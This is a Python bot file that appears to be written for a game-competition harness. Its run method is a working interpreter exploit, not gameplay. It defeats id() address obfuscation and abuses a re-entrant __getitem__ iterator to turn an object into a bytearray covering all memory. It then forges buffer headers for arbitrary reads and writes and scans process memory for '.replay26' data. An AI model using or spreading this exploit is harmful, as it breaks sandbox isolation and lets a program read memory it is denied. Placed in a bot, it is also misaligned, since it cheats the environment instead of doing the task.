import io
import struct
import sys
from cambc import Controller

TARGET = b".replay26"
PAGE = 4096
PROBE_STEP = 1 << 20
ADDR_MAX = 1 << 47
TIME_LIMIT = 1800

_OB_SIZE = 16
_OB_ALLOC = 24
_OB_BYTES = 32
_OB_START = 40


class Player:

    def __init__(self) -> None:
        self._addr = PAGE
        self._log: str = ""

    def run(self, c: Controller) -> None:  # type: ignore[override]

        if self._log:
            print(self._log)
            self._log = ""

        if self._addr >= ADDR_MAX:
            return

        # Wrap fd=2 (stderr) without opening a path — always available.
        # Write 1 byte as a probe: EFAULT -> OSError (unmapped), success -> mapped.
        # Actual data is read via obj[] slice, no pipe/drain needed.
        probe_f = io.FileIO(2, "wb", closefd=False)


        sentinel = object()
        xor = int(repr(sentinel).split("0x")[-1].rstrip(">"), 16) ^ id(sentinel)

        def real_id(o: object) -> int:
            return id(o) ^ xor

        i64_max = 0x7FFFFFFFFFFFFFFF
        buf = bytearray(
            struct.pack(
                "<QQQQQQqqq",
                0,
                0,
                0x12345,
                real_id(bytearray),
                i64_max,
                i64_max,
                0,
                0,
                0,
            )
        )

        class Victim:
            __slots__ = ("lock",) * 20

            def __init__(self) -> None:
                self.lock = False

            def __getitem__(self, _: int) -> None:
                if self.lock:
                    raise IndexError
                self.lock = True
                next(it)

        obj = Victim()
        obj_size = obj.__sizeof__()
        it = iter(obj)
        list(it)
        _resized = buf.ljust(obj_size, b"\0")
        assert type(obj) is bytearray

        obj_addr = real_id(obj)
        obj[obj_addr + 8 : obj_addr + 16] = real_id(bytearray).to_bytes(8, sys.byteorder)

        idv = real_id(Victim)
        rc = int.from_bytes(obj[idv : idv + 8], sys.byteorder)
        obj[idv : idv + 8] = (rc + 1).to_bytes(8, sys.byteorder)

        probe = bytearray(PAGE)
        probe_addr = real_id(probe)

        import os as _os
        fd_r, fd_w = _os.pipe()
        fw = io.FileIO(fd_w, "wb", closefd=True)
        fr = io.FileIO(fd_r, "rb", closefd=True)

        def redirect(target: int, size: int) -> None:
            obj[probe_addr + _OB_SIZE  : probe_addr + _OB_SIZE  + 8] = size.to_bytes(8, sys.byteorder)
            obj[probe_addr + _OB_ALLOC : probe_addr + _OB_ALLOC + 8] = size.to_bytes(8, sys.byteorder)
            obj[probe_addr + _OB_BYTES : probe_addr + _OB_START + 8] = target.to_bytes(8, sys.byteorder) * 2

        def read_chunk(addr: int, size: int) -> bytes | None:
            redirect(addr, size)
            try:
                n = fw.write(probe)
            except OSError:
                return None
            return fr.read(n) if n else None

        def scan_region(base: int, region_size: int) -> list[tuple[int, bytes]]:
            hits: list[tuple[int, bytes]] = []
            for off in range(0, region_size, PAGE):
                data = read_chunk(base + off, PAGE)
                if data is None:
                    continue
                idx = 0
                while True:
                    idx = data.find(TARGET, idx)
                    if idx == -1:
                        break
                    abs_addr = base + off + idx
                    context = data[max(0, idx - 32) : idx + len(TARGET) + 64]
                    hits.append((abs_addr, context))
                    idx += len(TARGET)
            return hits

        pages_this_turn = 0
        while self._addr < ADDR_MAX:
            if pages_this_turn >= 1:
                obj[obj_addr : obj_addr + 8] = struct.pack("<Q", 0xFFFFFF)
                return
            for hit_addr, ctx in scan_region(self._addr, PROBE_STEP):
                self._log += f"FOUND at 0x{hit_addr:016x}: {ctx!r}\n"
            self._addr += PROBE_STEP
            pages_this_turn += PROBE_STEP // PAGE

        self._log += "scan complete\n"
        obj[obj_addr : obj_addr + 8] = struct.pack("<Q", 0xFFFFFF)
